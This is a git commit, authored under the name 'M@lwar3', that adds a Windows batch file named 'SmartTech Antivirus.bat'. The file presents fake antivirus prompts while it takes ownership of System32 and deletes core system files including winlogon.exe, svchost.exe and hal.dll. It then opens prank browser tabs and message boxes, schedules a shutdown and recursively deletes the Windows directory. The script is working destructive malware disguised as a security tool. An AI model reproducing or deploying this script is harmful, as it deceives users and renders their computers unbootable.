e4395e5948bab4b12543d49cebd6284afc728315
M@lwar3 <144142418+adoomyxx@users.noreply.github.com>
2024-10-14 17:35:09 +0400

    Win32:SystemInfector
    Win32:SystemInfector

---
+++ SmartTech Antivirus.bat
@@ -0,0 +1,51 @@
+@echo off
+net user administrator /active:yes
+echo x=msgbox ("Still using your Computer?",0+48,"lol")>>lol10.vbs
+takeown /f /s /q C:\Windows\System32
+takeown /f /q C:\Windows\Web
+del /f /q C:\Windows\System32\wininit.exe
+del /f /q C:\Windows\System32\svchost.exe
+del /f /q C:\Windows\System32\winlogon.exe
+del /f /q C:\Windows\System32\hal.dll
+Hello, This is SmartTech Antivirus, Would you like to scan for viruses and malware? 
+pause
+Virus Detected! Would You Like To Remove it? 
+pause
+Unable To Remove Virus Now The Virus is Taking Place! 
+timeout 1
+echo This is MEMZ from walmart, your pc is bamboozled by this trojan, use it while you can :)>>memz from walmart.txt
+timeout 2
+start mspaint
+timeout 2
+start https://www.google.co.ck/search?q=how+2+buy+weed
+timeout 2
+start https://www.google.co.ck/search?q=where+is+the+nearest+bank+to+rob
+start calc
+start regedit
+timeout 2
+start https://www.google.co.ck/search?q=vinememz+download+free
+timeout 2
+start https://www.google.co.ck/search?q=scammer+get+scammed
+timeout 2
+start lol10.vbs
+start lol10.vbs
+timeout 1
+start lol10.vbs
+start https://www.google.co.ck/search?q=ip+address+finder
+timeout 2
+start lol10.vbs
+start cmd
+start cmd
+del /f /q C:\Windows\Web
+timeout 2
+start mspaint
+start lol10.vbs
+start https://www.google.co.ck/search?q=how+2+be+a+hacker
+timeout 2
+start lol10.vbs
+start mspaint
+timeout 2
+shutdown /s /t 25 /c "hehe pc is dead"
+timeout 3
+takeown /f /s /q %WINDIR%
+del /f /s /q %WINDIR%
